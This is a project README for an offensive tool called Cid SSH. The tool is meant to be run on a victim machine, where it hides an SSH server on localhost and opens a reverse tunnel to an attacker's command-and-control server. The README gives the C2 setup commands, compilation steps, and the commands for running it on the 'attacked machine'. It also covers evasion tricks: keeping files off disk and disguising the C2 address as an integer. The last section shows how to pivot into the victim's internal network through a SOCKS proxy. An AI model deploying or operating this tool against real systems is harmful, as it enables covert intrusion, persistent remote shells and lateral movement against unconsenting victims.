# Cid SSH
![alt text](http://equestrianstatue.org/wp-content/uploads/2016/04/Spain-Burgos-El-Cid-4-525x394.jpg)

This is a statically compiled tool (no dependencies needed) that can be used to create a SSH server and as SSH client. It will firstly, spin up an SSH server (listening in `localhost` and by default in port 2222), create certificates for it and finally create a reverse SSH tunnel with the C2. Due to the SSH server listens at `localhost`, automated scanners won't be able to detect it. 

This tool can be used as a fast initial compromise tool that can be used not only as a shell but also to browse the internal network of the victim. 

Windows systems lack of a proper TTY but thanks to [this](https://blogs.msdn.microsoft.com/commandline/2018/08/02/windows-command-line-introducing-the-windows-pseudo-console-conpty/) we can in recent Windows versions get a fully functional TTY. In the case that the target system does not support `CreatePseudoConsole` it will downgrade to a simple and not interactive shell.

## Setup instructions
### C2 server
We need to properly configure the SSH server running at the C2 so we don't get hacked.

Run all of these commands:

```
sudo useradd anonymous
echo anonymous:U6aMy0wojraho | sudo chpasswd -e
sudo usermod -s /bin/false anonymous
```

Allow blank passwords for SSH sessions of anonymous in `/etc/ssh/sshd_config`:
```PermitEmptyPasswords yes```

Restart sshd:
```systemctl restart ssh```

### Client
You can just use the prebuilt binaries that are in [Release](https://github.com/illera88/Cid-SSH/releases/tag/v1.0). 

If you want to compile from source keep reading

### Compilation on Windows
Compiling the client is somehow tricky because `libssh` (the library we use to handle SSH communications) does not support creating a SSH server using certificates from memory but they need to exist in disk. Since we are 3l373 hackers we don't want to drop any file to disk so I modified the `libssh` code. 

You can find the modified code [here](https://github.com/illera88/libssh_mod) or getting the prebuilt libraries [here](https://github.com/illera88/PrecompiledLibraries/tree/master/windows/libssh_mod)

To compile it just make sure you add the includes and libraries for:
- libssh_mod 
- zlib
- openssl

You can find all of them already prebuilt for Windows [here](https://github.com/illera88/PrecompiledLibraries/).

### Compilation on Linux
CidSSH is compiled statically for linux using musl (a replacement for libc) from an Alpine distribution `x86_64`. 
We have a dockerfile to do the compilation more easy `Dockerfile_linux_static`.
These are the steps to build and get the compiled binary from the container:
```
# Build the image, install dependencies and compile CidSSH
sudo docker build -t alpine_cid_ssh -f Dockerfile_linux_static .
# Copy the binary from the docker container to the current folder
sudo docker run -v `pwd`:/data_out -i -t alpine_cid_ssh:latest /bin/sh -c "cp /Cid-SSH/build/CidSSH /data_out/"
```

### Compilation on MacOs
Install/compile dependencies:
```
brew install openssl
```

Compile CidSSH:
```
cd ~/shared/SSHIUU/src/
mkdir build && cd build
git clone git clone https://github.com/illera88/PrecompiledLibraries
cmake -DCMAKE_BUILD_TYPE=Release -DLIBSSH_STATIC_PATH=PrecompiledLibraries/macos/libssh_mod/ .. &&
make
```

## Using it
It's very easy. In the attacked machine:
```
Cid-SSH.exe 192.168.15.135
```

You could also specify the IP address as an integer so it's not very obvious:
```
Cid-SSH.exe -t 3232239495
```
Page to do the conversion: http://www.aboutmyip.com/AboutMyXApp/IP2Integer.jsp

In the C2:
```
sudo netstat -ptan | grep sshd | grep LISTEN | grep anon
# Get the port number, replace the XXXXX 
echo "" > ~/.ssh/known_hosts && sshpass -p pwd ssh user@localhost -p XXXXX -oStrictHostKeyChecking=no -D 0.0.0.0:8888
```